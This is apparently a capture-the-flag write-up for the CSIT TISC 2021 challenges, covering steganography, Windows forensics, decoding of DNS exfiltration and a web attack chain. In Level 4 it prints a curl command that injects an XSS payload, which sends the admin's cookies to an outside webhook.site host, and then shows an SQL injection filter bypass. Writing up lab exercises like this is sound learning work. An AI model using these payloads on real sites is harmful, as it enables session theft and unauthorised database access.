Still in the midst of editing
# CSIT_TISC2021
## Level 1
### Challenge 1 : File1.wav
* Use Sonic Visualiser to open .wav file and the morse code appears.
![Morse_Code_In_File](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file1_wav.JPG)
* Flag : **CSITISLOCATEDINSCIENCEPARK**

### Challenge 2 : File2.jpg
* Information Hidden in the metadata. 
* Tricky things is when it is downloaded, photo is modified. 
* Hence we will need to use online exif tool to extract metadata from image url.
![EXIF](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file2_jpg.JPG)
* Flag : **2003:08:25 14:55:27**

### Challenge 3 : File3.jpg
1.  Used exiftool online --> no metadata
2.  Used HxD to strings to see any text hidden within the file. 
3.  Notable Strings 2 x "picture_with_text.jpg"
4.  Looked into the Hex Editor for "picture_with_text.jpg" text string and saw something suspicious : "PK"
![HXD](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_2_sus_pk_ext.JPG)
* Used binwalk to extract and xxd to look into the binaries of the unzipped file again and saw it... A suspicious looking message.
![BINWALK](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_3_extracted.JPG)
![XXD_OUT](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_4_xxd.JPG)
* Cyberchef ROT 13 and FLAG: **applecarrotpear** \
![FINAL](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_5_cyberchef.JPG)   

## Windows10.ova File
### Challenge 4 : What is the name of the user?
Windows Search --> System Information --> Flag: {TISC:Adam}

### Challenge 5 : Which time was the user's most recent logon? Convert it UTC before submitting.
EventViewer --> Filter Event 4624 --> Look out for Logon Type : 2 --> Flag

### Challenge 6 : A 7z archive was deleted, what is the value of the file CRC32 hash that is inside the 7z archive?
Download 7zip --> move into vm --> install 7zip in vm --> open archive  

### Challenge 7 : Question1: How many users have an RID of 1000 or above on the machine? What is the account name for RID of 501? What is the account name for RID of 503?
go to cmd --> wmic useraccounts get sid,name --> flag 
![wmic](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge7_RID.JPG)
Flag : **1-Guest-DefaultAccount**

### Challenge 8 : Question1: How many times did the user visit https://www.csit.gov.sg/about-csit/who-we-are ? How many times did the user visit https://www.facebook.com ? How many times did the user visit https://www.live.com ?
Use Nirsoft BrowsingHistoryView 
![Browsing_Hist](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge8_BrowsingHistory.JPG)
Flag : **0-0-2**

### Challenge 9 : A device with the drive letter “Z” was connected as a shared folder in VirtualBox. What was the label of the volume? Perhaps the registry can tell us the "connected" drive?
With reference to [this](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/mapped-network-drive-disconnected): 
```
1. In Registry Editor, locate the following registry subkey: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2

2. Right-click the mapped drive that you want to remove. For example, right-click `##Server_Name#Share_Name`, and then click Delete.
```
The answer can be found at MountPoints2 \
![MPt2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge9_MountPoints.JPG)
Flag : **VBoxSvr**

### Challenge 10 : A file with SHA1 0D97DBDBA2D35C37F434538E4DFAA06FCCC18A13 is in the VM… somewhere. What is the name of the file that is of interest?
Using any tool online that can search files by hash.
![FileFinder](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge10_FileSearch_Hash.JPG)
Flag : **otter-singapore.jpg**

## Level 2
### We have detected and captured a stream of anomalous DNS network traffic sent out from one of the PALINDROME compromised servers. None of the domain names found are active. Either PALINDROME had shut them down or there's more to it than it seems. This level contains 2 flags and both flags can be found independently from the same pcap file as attached here.

* Open pcap --> saw a pattern d33d(2 digit)(7char) in all the DNS packets.
* It took me a while to realise that I will need to split 2 digit and 7 char
* Therefore I used tshark to keep only the data field of the DNS packets and output them into a text file. 
* A python [script](https://github.com/irboi746/CSIT_TISC2021/blob/main/Stage2_code/grep_cipher.py) was included in this repo to help split the tshark output.
### DEE-NA-SAW as a need Part 2
* Using this python [script](https://github.com/irboi746/CSIT_TISC2021/blob/main/Stage2_code/grep_cipher.py), I extracted the 7char payload and pasted them into cyberchef.
* The output is as follows : \
![DNSoutput1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L2Part2.jpg)
* After using the cyberchef magic wand (auto-decode) function output is as follow : \
![DNSoutput2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L2Part2_2.JPG)
Flag : **TISC{n3VEr_0dd_0r_Ev3n}**
* DEE-NA-SAW part 2 has a peculiar string ***"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz+/"***
### DEE-NA-SAW as a need Part 1
* First I realised that the numbers do not pass 64.
* Hence I hypothesise that it has to be some form of substitution cipher.
* Tried using ASCII table and different forms of substitution until... I remembered the string in Part2.
* wrote a python [script](https://github.com/irboi746/CSIT_TISC2021/blob/main/Stage2_code/substitution.py) to do a substitution for above string with the 2 digit numbers in part 1 
* suspects that the plaintext is a base64 encoded data 
* again, I threw into cyberchef to decode base64 with custom string ***"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz+/"***
![cyberchef_out](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/Stg2Pt1_CyberChef_decode.JPG)
* Then I observed that there is a PK file extension
* extract as zip file and saw there were various xml files. 
* It seems like a word file but, I just opened them using the browser instead. 
* Output is as follows : "What you Seek is within"
![extracted1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/Stg2Pt1_what_you_seek.JPG)
![extracted2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/Stg2Pt1_flag.JPG)
* Flag : **TISC{1iv3_n0t_0n_3vi1}**

## Level 3
### An attack was detected on an internal network that blocked off all types of executable files. How did this happen? Upon further investigations, we recovered these 2 grey-scale images. What could they be?
**Attempted but did not complete**

## Level 4
### One day, the admin of Apple Story Pte Ltd received an anonymous email.
> Dear admins of Apple Story, We are PALINDROME. We have took control over your system and stolen your secret formula! Do not fear for we are only after the money.Pay us our demand and we will be gone. For starters, we have denied all controls from you. We demand a ransom of 1 BTC to be sent to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 by 31 dec 2021. Do not contact the police or seek for help. Failure to do so and the plant is gone. We planted a monitoring kit so do not test us. Remember 1 BTC by 31 dec 2021 and we will be gone. Muahahahaha. Regards, PALINDROME
### Management have just one instruction. Retrieve the encryption key before the deadline and solve this.
* since hint is free anyway, might as well check it right? \
![hint](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_1_hint.JPG)
* So... after some googling... Here are some possiblilities
   1. https://www.riskiq.com/what-is-magecart/
   2. https://heimdalsecurity.com/blog/magecart-group-conceal-stolen-credit-card-details-into-image-files/
   3. https://thehackernews.com/2021/05/magecart-hackers-now-hide-php-based.html 
* Checking out i : \
![ttp1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_2_ttp1.JPG)
* tried looking for javascripts that are running and see if there are any vulnerability. 
* below is the only script that can be found, nothing vulnerable there. 
![ttp1_2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp1_1.JPG)
* Tried all the web attacks on the payment page. Nothing much from there

* Checking out ii : \
![ttp2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_2_ttp2.JPG)
* checking out the images within the website 
![ttp2_2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp2_1.JPG)
* nothing suspicious about the svg image. Hex output seems normal
* nothing suspicious about the gif. All looks normal, even after using hex editor to skim through and strings, nothing suspicious

* Checking out iii : \
![ttp3](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_2_ttp3.JPG)
* checking the favicon of the website 
![ttp3_2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp3_1.JPG)
* same procedure as images above which is to throw into cyberchef and look at the hex and... found these :  
![ttp3_3](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp3_2.JPG)
* After Decoding with base64
![ttp3_4](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp3_3.JPG)
* Nice! Another webpage 
![new_page1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_2.JPG)
![new_page2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_1.JPG)
* From the above base64 encoded command it seems to be doing a POST request with a certain field.
![new_page3](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_3.JPG)
* Hmm what are those html outputs?
* Wow, it seems to generate certain html file which outputs what was typed into the request
* robots.txt and found 2 interesting results
![robots](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_1_robots_txt.JPG)
* login.php leads to admin page, but it requires login credentials.
* Looking above, we see that admin is the one viewing the post request sent.
* Hence, it means that the admin is logged on. Which would mean that there is a potential for xss-cookie stealing.
* With Reference from this [website](https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/)
The commands used for XSS is as such
```
curl -X POST "http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php" -d "14c4b06b824ec593239362517f538b29=<script>document.write('<img src="https://webhook.site/694ffb57-9ed8-4db2-86ae-5463fea3af0b?c='%2bdocument.cookie%2b'" />');</script>"
```
* BINGO! Cookie was stolen ! \
![cookie_stolen](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_2.JPG)
* Logging into the admin page leads to this : \
![admin_landing](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_3.JPG)
* There is a query box and it seems like it can be manipulated. (SQL Injection) 
* debug=TRUE leads to debug message as photo \
![debug_error](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_4_debug_out.JPG)
* we can come up with the hypothesis that SQL query is 
```
SELECT * FROM status WHERE filter=filter AND ID>0
```
* from the debug message, we realise that query uses "'" single quote
* 'OR'1-- yields empty field which means that there is a special character filter
* removing "--" yields 
* Thus we seem to be very close.
* It now seem like we need to test for what are the useable characters and what are not.
* using 'OR'1 and appending special characters to it we came to # and the flag is out.
![Flag](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_5_flag.JPG)
* Further investigation and we find out that # actually comments out ID>0 and hence the query will output what is on ID=0  





